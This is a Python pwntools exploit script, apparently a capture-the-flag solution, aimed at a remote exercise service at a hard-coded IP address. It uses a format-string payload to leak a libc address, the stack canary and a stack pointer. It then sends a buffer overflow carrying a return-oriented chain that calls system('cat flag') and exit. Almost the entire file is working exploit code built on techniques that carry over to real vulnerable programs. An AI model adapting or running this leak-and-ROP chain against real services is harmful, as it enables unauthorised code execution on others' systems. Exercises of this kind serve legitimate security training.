from pwn import * # CONNECT:
target = remote("51.15.171.241", 9012) # TCP connection on port 9000
#target = remote("0.0.0.0", 9000) # TCP connection on port 9000
# target = process("./exo") # launch exercise exo100

#off_system = 0x050D60
#off_exit = 0x0EAC70
#addr_dup2 = 0x01151C0 # dup2 13: b'0x7ffff7e9e1c0\n'

off_system = 0x050D60
off_exit = 0x0EAC70
addr_dup2 = 0x01151C0 # dup2 13: b'0x7ffff7e9e1c0\n'


payload = b'%13$p|%147$p|%148$p' #stack : 149 canary : 147
target.sendline(payload)
res = target.recvline()
print(res)
res = res.decode().strip("\n").split("|")
print(res)
leak_addr = int(res[0],16)
leak_canary = int(res[1], 16)
leak_stack = int(res[2],16)

#exit()
# ldd exo
libc_base_addr = leak_addr - addr_dup2

print(f'leak_addr: {hex(leak_addr)}\n')
print(f'Leak canary: {hex(leak_canary)}\n')
print(f'LIBC base: {hex(libc_base_addr)}\n')

# readelf -s libc-2.31_32b.so | grep system
memory_system_addr = libc_base_addr + off_system
memory_exit_addr = libc_base_addr + off_exit
buf_addr = (leak_stack - 0x490)
sys_argument_addr = buf_addr + 0x408 + 6 * 8


buf = b'n'
buf += b'A' * (0x408- len(buf)) # 1032 = 0x408
buf += p64(leak_canary)
buf += b'B' * 8 # add padding

print("system addr: %s" % hex(memory_system_addr))
print("exit addr: %s" % hex(memory_exit_addr))
print("system argument addr: %s" % hex(sys_argument_addr))

# addr return gadget | rp-lin-gcc/rp-lin -f rop/rop200/exo -r4 --colors | grep rdi
buf += p64(0x4014c3)

# addr string sys_argument_addr => addr of cat flag
buf += p64(sys_argument_addr)

# addr system
buf += p64(memory_system_addr) # system

# addr exit
buf += p64(memory_exit_addr) # exit
buf += b"     cat flag\0" # cat flag str

print("sending...")
target.sendline(buf)
print("recv...")

for i in range (100) :
    print(target.recvline())

